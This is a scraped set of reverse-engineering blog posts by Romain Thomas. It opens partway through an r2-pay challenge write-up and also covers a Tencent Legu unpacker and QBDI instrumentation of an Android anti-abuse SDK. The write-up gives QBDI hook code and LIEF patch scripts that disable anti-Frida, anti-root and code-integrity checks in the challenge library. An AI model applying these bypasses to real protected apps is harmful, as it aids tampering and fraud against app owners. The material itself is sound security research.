it\u0026rsquo;s the case when Frida is used in the application :-)\n0x0368e4: snprintf(\u0026#39;/proc/self/task/9719/status\u0026#39;, \u0026#39;/proc/self/task/%s/status\u0026#39;): \u0026#39;/proc/self/task/9719/status\u0026#39; 0x036a1c: syscall: openat(0xffffffffffffff9c, \u0026#39;/proc/self/task/9719/status\u0026#39;) 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;N\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;a\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;m\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;e\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;:\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1) 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;g\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;m\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;a\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;i\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1): \u0026#39;n\u0026#39; 0x03897c: syscall: read(73, 0x7ffc400af4, 1) 0x03897c: closedir() # Crash! To bypass this check, one can statically patch the syscall or we can dynamically change the behavior of snprintf(..., '/proc/self/task/%s/status') in order to always returns the same status (e.g. /proc/self/task/123/status). Concretely, it could be done by hooking snprintf and by forcing the output string to /proc/self/task/123/status.\nAnti-Frida #2 Still in the sub_1a690 function, the anti-frida checks continue by inspecting the file descriptors of the process. It iterates over /proc/self/fd/%s and looks at the underlying symlink.\nFrida server \u0026mdash; which is running globally on the device \u0026mdash; and Frida agent \u0026mdash; which is injected in the process \u0026mdash; communicate with named pipes that are associated with a file descriptor.\nIf Frida server is running, we can observe the following values:\n0x04308c: lstat(\u0026#39;/proc/self/fd/32\u0026#39;) 0x043448: syscall: readlinkat(0xffffffffffffff9c, \u0026#39;/proc/self/fd/32\u0026#39;, 0x7ffbffdc10, 256): \u0026#39;anon_inode:[eventfd]\u0026#39; 0x041844: readdir(\u0026#39;33\u0026#39;) 0x043078: snprintf(\u0026#39;/proc/self/fd/33\u0026#39;, \u0026#39;/proc/self/fd/%s\u0026#39;): \u0026#39;/proc/self/fd/33\u0026#39; 0x04308c: lstat(\u0026#39;/proc/self/fd/33\u0026#39;) 0x043448: syscall: readlinkat(0xffffffffffffff9c, \u0026#39;/proc/self/fd/33\u0026#39;, 0x7ffbffdc10, 256): \u0026#39;anon_inode:[eventfd]\u0026#39; 0x041844: readdir(\u0026#39;34\u0026#39;) 0x043078: snprintf(\u0026#39;/proc/self/fd/34\u0026#39;, \u0026#39;/proc/self/fd/%s\u0026#39;): \u0026#39;/proc/self/fd/34\u0026#39; 0x04308c: lstat(\u0026#39;/proc/self/fd/34\u0026#39;) 0x043448: syscall: readlinkat(0xffffffffffffff9c, \u0026#39;/proc/self/fd/34\u0026#39;, 0x7ffbffdc10, 256): \u0026#39;/data/local/tmp/re.frida.server/linjector-500\u0026#39; # Crash! In this case, the file descriptor 34 is associated with /data/local/tmp/re.frida.server/linjector-500 which triggers the detection and the application crashes.\nAs for /proc/self/task/\u0026lt;tid\u0026gt;/status, one can disable this check by statically patching the syscalls or by dynamically changing the result of readlinkat(). For instance, we can use QBDI to instrument syscall instructions and process the result of readlinkat() in an user callback:\nvm.addMnemonicCB(\u0026#34;SVC\u0026#34;, POST_INST, [] (VMInstanceRef vm, GPRState* gprState, FPRState*, void* data) { if (gprState-\u0026gt;x8 != __NR_readlinkat) { return VMAction::CONTINUE; } std::string buf = reinterpret_cast\u0026lt;char*\u0026gt;(gprState-\u0026gt;x2); if (buf.find(\u0026#34;re.frida.server\u0026#34;) != std::string::npos) { static const std::string FAKE_VALUE = \u0026#34;anon_inode:[eventfd]\u0026#34;; // Bypass Frida detection! memcpy( reinterpret_cast\u0026lt;void*\u0026gt;(gprState-\u0026gt;x2), reinterpret_cast\u0026lt;void*\u0026gt;(FAKE_VALUE.c_str()), FAKE_VALUE.size() + 1 ); gprState-\u0026gt;x0 = FAKE_VALUE.size() + 1; } return VMAction::CONTINUE; }, ctx); Anti-Frida #3 ? I\u0026rsquo;m not sure if the following calls sequence is used to check the libc\u0026rsquo;s integrity against Frida but at the end of the thread\u0026rsquo;s routine, we can observe these syscalls:\n0x048ff0: syscall: openat(0xffffffffffffff9c, \u0026#39;/proc/self/maps\u0026#39;): 51 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;1\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;2\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;c\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;0\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;0\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;0\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;0\u0026#39; 0x04ae6c: syscall: read(51, 0x7ffc006578, 1): \u0026#39;0\u0026#39; ... 0x0513f8: sscanf(\u0026#39;7fa65c0000-7fa65dc000 r-xp 00000000 08:07 1275/system/lib64/libc.so\u0026#39;, \u0026#39;%lx-%lx %s %s %s %s %s\u0026#39;) 0x056034: syscall: close(51) The result of sscanf() could be used to check the page permissions (e.g. rwxp) or to the libc\u0026rsquo;s base address (to check if it is consistent).\nAnti-Root In addition to the root-beer detection, the library embeds another root detection located in the second ELF constructor. This constructor \u0026mdash; sub_77D14 \u0026mdash; performs the same early checks as the first constructor on the libc\u0026rsquo;s .plt integrity before spawning another thread routine, sub_98c00.\n0x08861c: pthread_create(0xfa780b70, 0x0, 0x98c00, 0x0) By tracing the thread\u0026rsquo;s routine, we notice that it checks if su files are present on the device through three different calls:\nOne call to open(): 0x099180: open(\u0026rsquo;/system/xbin/su\u0026rsquo;) One syscall to openat(): 0x0992a4: syscall: openat(\u0026hellip;, \u0026rsquo;/data/su\u0026rsquo;) One syscall to faccessat(): 0x0993f0: syscall: faccessat(\u0026rsquo;/sbin/su\u0026rsquo;) 0x099180: open(\u0026#39;/data/local/su\u0026#39;): -1 0x0992a4: syscall: openat(0xffffffffffffff9c, \u0026#39;/data/local/su\u0026#39;): -2 0x0993f0: syscall: faccessat(\u0026#39;/data/local/su\u0026#39;): -2 0x099180: open(\u0026#39;/data/local/bin/su\u0026#39;): -1 0x0992a4: syscall: openat(0xffffffffffffff9c, \u0026#39;/data/local/bin/su\u0026#39;): -2 0x0993f0: syscall: faccessat(\u0026#39;/data/local/bin/su\u0026#39;): -2 0x099180: open(\u0026#39;/data/local/xbin/su\u0026#39;): -1 0x0992a4: syscall: openat(0xffffffffffffff9c, \u0026#39;/data/local/xbin/su\u0026#39;): -2 0x0993f0: syscall: faccessat(\u0026#39;/data/local/xbin/su\u0026#39;): -2 0x099180: open(\u0026#39;/sbin/su\u0026#39;): 51 0x0992a4: syscall: openat(0xffffffffffffff9c, \u0026#39;/sbin/su\u0026#39;): 52 0x0993f0: syscall: faccessat(\u0026#39;/sbin/su\u0026#39;): 52 Crash! By forcing the results of these functions to -1 or -2, we can disable the checks.\nHere is the list of the su-files that are used in this detection:\n/data/local/su /data/local/bin/su /data/local/xbin/su /sbin/su /su/bin/su /system/bin/su /system/bin/.ext/su /system/bin/failsafe/su /system/sd/xbin/su /system/usr/we-need-root/su /system/xbin/su /cache/su /data/su /dev/su At the end of the thread\u0026rsquo;s routine, we can also observe the following calls that are probably used to check if the application is running on a real Android system.\n0x099e30: syscall: faccessat(\u0026#39;/system\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/system/bin\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/system/sbin\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/system/xbin\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/vendor/bin\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/sbin\u0026#39;) 0x099e30: syscall: faccessat(\u0026#39;/etc\u0026#39;) Static bypass with LIEF In the previous sections, we described the anti-root, anti-debug and anti-frida checks made in the ELF constructors. The same dynamic checks are also performed in the gXftm3iswpkVgBNDUp function at the following locations:\n0x09f2f8: /proc/self/status 0x0d4840: /proc/self/fd/ 0x0dec8c: /proc/self/task/\u0026lt;tid\u0026gt;/status While the checks in gXftm3iswpkVgBNDUp can be dynamically disabled when instrumenting the function, the checks in the ELF constructors are annoying.\nOne way to disable the checks in the thread\u0026rsquo;s routines is to disable the pthread_create(...). It can be achieved by patching the .plt entry associated with the function:\nmov x0, xzr; ret; Thanks to llvm-mc, we can get the raw bytes of these instructions:\n$ echo \u0026#34;mov x0, xzr;ret;\u0026#34;|llvm-mc -arch=aarch64 -show-encoding .text mov x0, xzr // encoding: [0xe0,0x03,0x1f,0xaa] ret // encoding: [0xc0,0x03,0x5f,0xd6] Finally, we can patch the .plt with LIEF:\nimport lief lib = lief.parse(\u0026#34;./libnative-lib.so\u0026#34;) lib.patch_address(0x5870, [0xe0,0x03,0x1f,0xaa]) lib.patch_address(0x5874, [0xc0,0x03,0x5f,0xd6]) lib.write(\u0026#34;./libnative-lib-patched.so\u0026#34;) Using these patches and the Frida script exposed in the first section, we are able to load the application but the other detections are triggered in gXftm3iswpkVgBNDUp. Nevertheless, with the Frida\u0026rsquo;s stalker or QBDI we can trace the instructions and disable the other checks.\nIf one wants to completely bypass all the protections statically, here are the patches:\nimport lief lib = lief.parse(\u0026#34;./libnative-lib.so\u0026#34;) # Keys are str objects for a better understanding :) INST = { \u0026#34;mov x0, #0\u0026#34;: [0xe0, 0x03, 0x1f, 0xaa], \u0026#34;ret\u0026#34;: [0xc0, 0x03, 0x5f, 0xd6], \u0026#34;nop\u0026#34;: [0x1f, 0x20, 0x03, 0xd5], } PATCHES = [ # Patch the .plt entry of pthread_create (0x5870, INST[\u0026#34;mov x0, #0\u0026#34;]), (0x5874, INST[\u0026#34;ret\u0026#34;]), # Disable anti-frida checks (0x0d718c, INST[\u0026#34;mov x0, #0\u0026#34;]), # /proc/self/fd : patch the result of readlinkat syscall (0x0e1940, INST[\u0026#34;mov x0, #0\u0026#34;]), # /proc/self/task/\u0026lt;tid\u0026gt;/status: patch the result of read syscall # Disable .text integrity checks (0xB64D0, INST[\u0026#34;nop\u0026#34;]), ] for patch in PATCHES: lib.patch_address(*patch) lib.write(\u0026#34;libnative-lib.so\u0026#34;) When writing this write-up, I realized that patching the syscalls involved in the anti-frida (/proc/self/fd/ and /proc/self/task/\u0026lt;tid\u0026gt;/status) makes the application crash.\nIt turns out that the library seems to implement code integrity on the .text section that I didn\u0026rsquo;t notice when running the function through QBDI. Nevertheless, by tracing the basic block3 we can identify the basic block involved in the integrity check and patch it.\nThe scripts and the patched library are available here . Regarding JNI_OnLoad(), a trace generated with QBDI\u0026rsquo;s ExecBroker leads to following result:\nJNI_OnLoad() { 0x09af3c: GetEnv(0x7fcb507460, 0x10006) 0x09b0ac: FindClass(\u0026#34;re/pwnme/MainActivity\u0026#34;): 537 0x09b1b4: RegisterNatives() gXftm3iswpkVgBNDUp ([BB)[B -\u0026gt; \u0026#34;libnative-lib.so@0x9b41c\u0026#34; } Then, we can extract the function\u0026rsquo;s offset: gXftm3iswpkVgBNDUp: 0x9b41c.\nSummary \u0026amp; Conclusion Whilst Frida detections are usually based on sockets and library names in /proc/self/maps, this challenge introduces two detections based on named pipes:/proc/self/fd and thread status: /proc/self/task/\u0026lt;tid\u0026gt;/status which are pretty cool :-)\nThese checks are performed in two locations:\nThe ELF constructors The function gXftm3iswpkVgBNDUp() The implementation in the ELF constructors might be tricky to analyse since the functions are called before any other classical functions (which includes JNI_OnLoad()). Nevertheless, thanks to the interface of the ELF loader, it exposes the function call_array(...)4 which is handy to process the ELF constructors.\nThis function is mangled as __dl__ZL10call_arrayIPFviPPcS1_EEvPKcPT_mbS5_ in /system/bin/linker64 Since QBDI is not detected in this challenge, it\u0026rsquo;s a good opportunity to give it a try:\nhttps://github.com/QBDI/QBDI Acknowledgments Thanks to Eduardo Novella (@enovella_) and Gautam Arvind (@darvincisec) for this interesting and realistic challenge they created!\nAlso thanks to Quarkslab that allowed this publication. For those who are interested in similar topics, you can take a look at the Quarkslab\u0026rsquo;s blog.\nReferences GoSSIP-SJTU/Armariris - StringObfuscation.cpp#L140\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://developer.android.com/training/articles/perf-jni#native-libraries\u0026#160;\u0026#x21a9;\u0026#xfe0e;\naddVMEventCB(VMEvent::BASIC_BLOCK_ENTRY, ...);\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nlinker/linker_soinfo.cpp:420\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":160056e4,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"9caa668feaa147d7e3172fbb0748659d","permalink":"https://www.romainthomas.fr/post/20-09-r2con-obfuscated-whitebox-part1/","publishdate":"2020-09-20T00:00:00Z","relpermalink":"/post/20-09-r2con-obfuscated-whitebox-part1/","section":"post","summary":"This first blog post describes the protections in the challenge r2-pay.","tags":["android","reverse engineering","write-up","obfuscation","whitebox"],"title":"r2-pay: anti-debug, anti-root \u0026 anti-frida (part 1)","type":"post"},{"authors":["Romain Thomas"],"categories":null,"content":"Legu Unpacker Scripts to unpack Android applications protected by Tencent Legu. It only works with versions 4.1.0.15 and 4.1.0.18 of Legu.\nBlog post: https://www.romainthomas.fr/post/a-glimpse-into-tencents-legu-packer/\nOverview The original DEX files are located in assets/0OO00l111l1l with the following layout:\nOne can find the details of this structure in the Kaitai file: legu_packed_file.ks\nThe hashmap embedded in the second part is described in the legu_hashmap.ks file:\npylegu pylegu contains the Python bindings to decrypt and uncompress the data embedded in assets/0OO00l111l1l.\nTo compile and install pylegu:\n$ cd pylegu $ python3.7 ./setup.py build -j4 install --user $ python -c \u0026#34;import pylegu\u0026#34; One could also use jap/pyucl to decompress the data and aguinet/dragonffi to bind the custom implementation of XTEA.\nGet Started The sample com.intotherain.voicechange.apk is a suspicious application that can be unpacked as follows:\n$ python ./unpack.py ./samples/com.intotherain.voicechange.apk [+] Legu version: 4.1.0.15 [+] Password is \u0026#39;IPk2Hw7AKTuIQBlc\u0026#39; [+] Number of dex files: 1 [+] Unpacking #1 DEX files ... [+] dex 0 compressed size: 0x1619a3 [+] dex 0 uncompressed size: 0x5671f8 [+] Unpacking #1 hashmap ... [+] hashmap 0 compressed size: 0x4399c [+] hashmap 0 uncompressed size: 0x95558 [+] Unpacking #1 packed methods ... [+] packed methods 0 compressed_size: 0xf4636 [+] packed methods 0 uncompressed_size: 0x1e3072 [+] Stage 2: Patching DEX files [+] Unpacked APK: unpacked.apk The unpacked DEX files are located in the unpacked.apk file.\nRequirements Python \u0026gt;= 3.7 Kaitai Struct LIEF pylegu ","date":1579737600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"a456ba06b0f13adb55cc423bbaa4319d","permalink":"https://www.romainthomas.fr/project/legu_unpacker/","publishdate":"2020-01-23T00:00:00Z","relpermalink":"/project/legu_unpacker/","section":"project","summary":"Scripts to unpack Android applications protected by Tencent Legu","tags":["android"],"title":"Tencent Legu Unpacker","type":"project"},{"authors":["Romain Thomas"],"categories":["Android","Reverse Engineering"],"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s Blog Introduction This blog post deals with the Legu packer, an Android protector developed by Tencent that is currently one of the state-of-the-art solutions to protect APK DEX files. The packer is updated frequently and this blog post focuses on versions 4.1.0.15 and 4.1.0.18.\nOverview An application protected with Legu is composed of two native libraries: libshell-super.2019.so and libshella-4.1.0.XY.so as well as raw binary files embedded in the resources of the APK:\ntosversion 0OO00l111l1l 0OO00oo01l1l o0oooOO0ooOo.dat The main logic of the packer is located in the native library libshell-super.2019.so which basically unpacks and loads the protected DEX files from the resources.\nSome functions of the library are obfuscated but thanks to Frida/QBDI their analysis is not a big deal.\nInternals Basically, the original DEX files are located in the assets/0OO00l111l1l file along with the information required to unpack them.\nThe following figure lays out the structure of this file.\nIn the assets/0OO00l111l1l file, the first part contains the original DEX files with the same number of classes\u0026lt;N\u0026gt;.dex according to the multi-DEX feature of the original APK. These DEX files are not exactly the original ones, as their Dalvik bytecode have been NOP-ed by Legu. Therefore, a dump of these files only gives information about the classes\u0026rsquo; names, not the code logic:\nThen follows what we called a hashmap that is used to link a class name (e.g. Lcom/tencent/mmkv/MMKV;) to an offset in the data block located in the third part of the file. This data block contains the original Dalvik bytecode of the methods.\nActually, the first part that contains the altered DEX files, is compressed with NRV 1. The second part — the hashmap — is also compressed with NRV but the packer adds a layer of encryption through a slightly modified version of XTEA 2. Finally, the last part is compressed and encrypted with the same algorithms as the previous one.\nRegarding the hashmap, it uses a custom structure that has been reversed and lead to a Kaitai structure available here: legu_packed_file.ksy, legu_hashmap.ksy\nIts overall layout is exposed in the next figure:\nUnpacking process Let\u0026rsquo;s say that the application needs to use the packed Java class Lcom/tencent/mmkv/MMKV;.\nFirst, the packer\u0026rsquo;s runtime transforms the class name into an integer with the dvmComputeUtf8Hash() hash function 3. This integer is then used as an index into the hashmap whose value is a structure that contains information about the class in the packed data (blue area in the figure). The first attribute of this structure — utf8_hash — is a copy of the hash value which is used to check that it is the right key/value association.\nThe class_info structure (blue block in the figure) next contains the packed method information (yellow area in the figure) whose size is the same as the original number of methods in the class. This structure makes the relationship between the NOP-ed bytecode offset in the altered DEX files and the offset in the original bytecode (red block). Finally, the packer copies the original bytecode into the altered DEX files.\nTo summarize, the first part contains the original DEX files with the Dalvik bytecode removed (NOP-ed). The last part contains the missing Dalvik bytecode and the second part makes the bridge between the altered DEX files and the Dalvik bytecode.\nCompression \u0026amp; Encryption To decrypt the hashmap and the Dalvik bytecode, the packer uses the first 16 bytes of assets/tosversion xored with a hard-coded key: ^hHc7Ql]N9Z4:+1m~nTcA\u0026amp;3a7|?GB1z@.\nLIB_KEY = b\u0026#34;^hHc7Ql]N9Z4:+1m~nTcA\u0026amp;3a7|?GB1z@\u0026#34; def key_derivation(key: bytes) -\u0026gt; bytes: return bytes(x1 ^ x2 for x1, x2 in zip(LIB_KEY, cycle(key))) Then, it uses a slightly modified version of XTEA that is given in the next listing:\nint xtea_decrypt(uint32_t* key, uint32_t* buf, size_t ilen, size_t nb_round) { const size_t count = ilen / 8; const size_t key_off = (ilen \u0026amp; 8) / 4; static constexpr uint32_t DELTA = 0x9e3779b9; const uint32_t key_0 = key[key_off + 0]; const uint32_t key_1 = key[key_off + 1]; for (size_t i = 0; i \u0026lt; count * 2; i += 2) { buf[i + 0] ^= key_0; buf[i + 1] ^= key_1; uint32_t sum = DELTA * nb_round; uint32_t temp0 = buf[i + 0]; uint32_t temp1 = buf[i + 1]; for (size_t j = 0; j \u0026lt; nb_round; ++j) { temp1 -= (key[2] + (temp0 \u0026lt;\u0026lt; 4)) ^ (key[3] + (temp0 \u0026gt;\u0026gt; 5)) ^ (temp0 + sum); temp0 -= (key[0] + (temp1 \u0026lt;\u0026lt; 4)) ^ (key[1] + (temp1 \u0026gt;\u0026gt; 5)) ^ (temp1 + sum); sum -= DELTA; } buf[i + 0] = temp0; buf[i + 1] = temp1; } return 0; } After the decryption routine, the packer decompresses the data with NRV, the same algorithm used to compress the altered DEX files:\nkey = key_derivation(open(\u0026#34;assets/tosversion\u0026#34;, \u0026#34;rb\u0026#34;).read()[:16]) for i in range(nb_dex_files): hashmap[i] = nrv_decompress(xtea_decrypt(blob1, key)) dalvik_bytecodes[i] = nrv_decompress(xtea_decrypt(blob2, key)) Unpacking Putting all the pieces together, we can statically unpack protected APKs and recover the original bytecode:\nHence, as we can automatically unpack such APKs, the unpacking process could be integrated into an automatic analysis pipeline.\nThe script and the Kaitai structures are available on the Quarkslab\u0026rsquo;s repository: legu_unpacker_2019, along with a suspicious application 4, packed and unpacked.\nAcknowledgments Thanks to my colleagues who proofread this article.\nReferences http://www.oberhumer.com/opensource/ucl/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://en.wikipedia.org/wiki/XTEA\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttp://androidxref.com/4.4.4_r1/xref/dalvik/vm/UtfString.cpp#88\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.virustotal.com/gui/file/708e6967920dcf2789b7183d714e73ab79a2f8b3ca71929b12aadeb2c58c2867/detection\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":1574726400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1652536515,"objectID":"a2bb3b32975c74e42cac7b55165ddd60","permalink":"https://www.romainthomas.fr/post/a-glimpse-into-tencents-legu-packer/","publishdate":"2019-11-26T00:00:00Z","relpermalink":"/post/a-glimpse-into-tencents-legu-packer/","section":"post","summary":"Analysis of Tencent Legu: a packer for Android applications.","tags":["android","reverse engineering","packer"],"title":"A Glimpse Into Tencent's Legu Packer","type":"post"},{"authors":["Romain Thomas"],"categories":["Android","Reverse Engineering"],"content":" This post has been originally posted on the Quarkslab\u0026rsquo;s Blog Introduction During the past few months we improved the ARM support in QBDI. More precisely, we enhanced the QBDI\u0026rsquo;s engine to support Thumb and Thumb2 instructions as well as Neon registers.\nDevelopment is still in progress and we need to clean the code and add non-regression tests compared to the x86-64 support.\nTo add Thumb and Thumb2 support, we tested the DBI against well-known obfuscators such as Epona, O-LLVM or Arxan, as we could expect good instruction coverage, corner cases and nice use cases. The native code came from Android JNI libraries embedded in different APKs.\nThis blog post introduces some QBDI features that could be useful to assess native code and speedup reverse engineering. To expose these features, we analyzed an Android SDK that aims to protect applications against API misuse.\nDynamic Instrumentation on Android Frida is one of the Android day-to-day dynamic instrumentation framework widely used to instrument applications. It can address both native code with inline hooking and Java side thanks to ART instrumentation 1.\nFrida works at the function level and in some cases we may need to have a finer granularity at the basic-block level or at the instruction level (i.e. have hooks on instructions)\nTo address this limitation, one trick commonly used is to combine hooking with emulation. One can use Frida to hook the function that we are interested in, then we can dump the CPU context and the memory state of the process and eventually continue the execution through an emulator like Miasm or Unicorn\nThis approach works pretty well but has a few limitations:\nSpeed: For large sets of functions. External calls: One needs to mock external calls behavior (e.g. strlen, malloc, \u0026hellip;). Some behaviors can be difficult to emulate: Thread, Android internal frameworks, \u0026hellip; Moreover, while it is quite simple to mock the behavior of strlen, it may be more challenging to mock JNI functions behavior like FindClass(), GetMethodID(), RegisterNatives(), \u0026hellip;\nThe design of QBDI provides a good trade-off between full instrumentation and partial emulation thanks to the ExecBrocker that enables to switch between instrumented code — our function — and non-instrumented code: strlen(), FindClass(), pthread_call_once(), \u0026hellip;\nThis diagram represents the instrumentation flow for the different scenarios:\nFor those who are interested in QBDI internals you can look at the 34C3 talk by Charles and Cédric 2. There are also examples in the GitHub repository 3.\nTo summarize, we can bootstrap QBDI as follows:\n// QBDI main interface QBDI::VM vm; // QBDI CPU state for GPR registers GPRState* state = vm.getGPRState(); // Setup virtual stack uint8_t *fakestack = nullptr; QBDI::allocateVirtualStack(state, /* size */0x100000, \u0026amp;fakestack); // { // Setup instrumentation ranges, callbacks etc, ... // } // Start Instrumentation: uintptr_t retval; bool ok = vm.call(\u0026amp;retval, /* Address of the function to instrument */); // Instrumentation Finished SDK Overview Among the QBDI tests, we analyzed an SDK that aims to protect applications against API abuses. This kind of protection is used to protect API endpoints against illegitimate uses: emulator, bots, \u0026hellip;\nTo protect the main application, the solution collects information about the device state: rooted, debugged, custom, then encodes this information with a proprietary algorithm and sends the encoded data to a server.\nThe server decodes the information sent by the device collector, performs analyses to check the device integrity and sends back a token that handles the information about whether the device is corrupted or not.\nThe following figure summarizes this process:\nSuch architecture is robust and similar to the one in Safetynet 4. On the other hand, the SDK has fewer permissions than Safetynet, therefore it cannot collect as much data about the device as SafetyNet does.\nWe started the analysis by monitoring the network traffic between the SDK and its server. At some point, we can observe the following request:\nIt is JSON encoded and the characters that look like random values are the encoded information sent by the device collector.\nThe analysis of the SDK aims to address these questions:\nHow the SDK checks if the device is rooted or not ? How the SDK detects if the application is being debugged ? What kind of information is collected from the device and how it is encoded ? After a look at the Java layer, we found that the logic of the solution is implemented in a JNI library that will be named libApp.so 5. The library exposes the following JNI functions:\n! With static analysis, we can identify that the function Java_XXX_JNIWrapper_ca3_14008() is the one involved in the generation of the sequence \u0026quot;QJRR{JJJGQJ~|MJJJ...\u0026quot;. It returns the encoded data as a java.lang.String and takes two parameters that are not mandatory: bArr, iArr 6.\nThe library as a whole is not especially obfuscated. Nonetheless, we find strings encoding and syscall replacement on well-known libc functions:\nread openat close \u0026hellip; This technique is commonly used to avoid hooking but the fact is that the given syscalls are wrapped in functions that are not inlined. Hence, one can hook the functions that wrap the associated syscall.\nGet Started with QBDI In order to fully understand the logic of this function, we instrumented the function through QBDI 7 associated with a set of instrumentation callbacks.\nThese callbacks aim to provide different kinds of information that will be useful to the analyst to understand the function logic. For instance, we can setup a first callback that records all the syscall instructions, we can also add a callback that records memory access.\nThe purpose of this blog post is to show how few — but well chosen — callbacks enable to understand the logic of the function.\nFirst of all, the native library embedded in the SDK can be loaded outside of the original APK using dlopen() / dlsym(). Moreover, one can instantiate a JVM thanks to the ART runtime (libart.so):\nint main(int argc, char** argv) { static constexpr const char* TARGET_LIB = \u0026#34;libApp.so\u0026#34;; void* hdl = dlopen(TARGET_LIB, RTLD_NOW); using jni_func_t = jstring(*)(JNIEnv* /* Other parameters are not required */); auto jni_func = reinterpret_cast\u0026lt;jni_func_t\u0026gt;(dlsym(hdl, \u0026#34;Java_XXX_JNIWrapper_ca3_14008\u0026#34;)); JavaVM* jvm, JNIEnv* env; ART_Kitchen(jvm, env); // Instantiate the JVM and initialize the jvm and env pointers } At this point, the jni_func() function is tied to Java_XXX_JNIWrapper_ca3_14008 and ready to be executed in main():\njstring output = jni_func(env); const char* cstring = env-\u0026gt;GetStringUTFChars(output, nullptr); console-\u0026gt;info(\u0026#34;Real Output: {}\u0026#34;, cstring); The output seems consistent with the network capture and the value \u0026quot;root: 1\u0026quot; too since we are on a rooted device 8\nNow, let\u0026rsquo;s run the function through QBDI:\nconsole-\u0026gt;info(\u0026#34;Initializing VM ...\u0026#34;); QBDI::VM vm; GPRState* state = vm.getGPRState(); uint8_t *fakestack = nullptr; QBDI::allocateVirtualStack(state, 0x100000, \u0026amp;fakestack); console-\u0026gt;info(\u0026#34;Instument module: {}\u0026#34;, TARGET_LIB); vm.addInstrumentedModule(TARGET_LIB); console-\u0026gt;info(\u0026#34;Simulate call in QBDI\u0026#34;); jstring dbioutput; bool ok = vm.call(\u0026amp;dbioutput, reinterpret_cast\u0026lt;rword\u0026gt;(jni_func), {reinterpret_cast\u0026lt;rword\u0026gt;(env)}); if (ok and dbioutput != nullptr) { console-\u0026gt;info(\u0026#34;DBI output {:x}\u0026#34;, env-\u0026gt;GetStringUTFChars(dbioutput, nullptr)); } This code provides the following output:\nEverything looks good, QBDI managed to fully instrument the function (which includes ARM / Thumb switch) and the result is similar to the real execution.\nAnalysis Now that we are able to run and instrument the function, we can start to add instrumentation callbacks to analyze its behavior.\nOne of the first callbacks that is useful to setup is a callback that instruments syscall instructions (i.e. svc #0). To do so, we can use the vm.addSyscallCB(position, callback, data).\nposition - It stands for the position of the callback: Before or after the syscall. callback - The callback itself. data - Pointer to user data (e.g. user context that register dynamic information) It leads to the following piece of code:\nauto syscall_enter_cbk = [] (VMInstanceRef vm, GPRState *gprState, FPRState *fprState, void *data) { const InstAnalysis* analysis = vm-\u0026gt;getInstAnalysis(ANALYSIS_INSTRUCTION | ANALYSIS_DISASSEMBLY); rword syscall_number = gprState-\u0026gt;r7; /* * std::string sys_str = lookup[syscall_number]; // Lookup table that convert syscall number to function */ console-\u0026gt;info(\u0026#34;0x{:06x} {} ({})\u0026#34;, addr, analysis-\u0026gt;disassembly, sys_str); return VMAction::CONTINUE; } vm.addSyscallCB(PREINST, syscall_enter_cbk, /* data */ nullptr); Before any syscall instructions, we perform a basic lookup on the syscall number stored in the R7 register to resolve its name.\nIt results in the following output:\nSince we are able to resolve syscall numbers into function names, we can improve the logic of callback to dispatch and print function parameters:\nauto syscall_enter_cbk = [] (...) { ... /* * Lookup table (syscall number, function pointer) * { * 322 -\u0026gt; on_openat * } */ auto function_wrapper = func_lookup[syscall_number]; return function_wrapper(...) } // Wrapper for openat syscall VMAction on_openat(VMInstanceRef vm, GPRState *gprState, ...) { auto path = reinterpret_cast\u0026lt;const char*\u0026gt;(gprState-\u0026gt;r1); console-\u0026gt;info(\u0026#34;openat({})\u0026#34;, path); return VMAction::CONTINUE; } By doing so on the common syscalls number, we get this new trace:\nBased on this output, we can figure out how root check (orange area) is done. It is performed by checking the existence of the following binaries:\n/system/bin/su /system/xbin/su /sbin/su \u0026hellip; The function also checks if some directories are present on the device (faccessat syscall):\n/data /tmp /system \u0026hellip; Especially, it would be suspicious if the directory /tmp were present on the device while it is standard to have /system and /data directories.\nRegarding the debug state of the process (blue area), it is done by looking at /proc/self/status. After analysis, the function checks the TracerPID attribute (cf More Android Anti-Debugging Fun - B. Mueller)\nFinally, the function processes the output of /proc/self/maps right before to returning the encoded values. It suggests that the data collected by the solution are based on this resource.\nEncoding Routine In the previous part we got a global overview about how the solution achieves root detection, debug detection and what kind of data is collected (i.e. process memory map).\nHowever, some questions are pending:\nWhat part of the process memory map is used: Base addresses ? Module paths ? Permissions ? How the data are encoded (i.e. how QJRR{JJJGQJ~|MJJJ... is generated) ? Along with the QBDI ARM support, we also added ARM support to resolve memory addresses during the instrumentation. It means 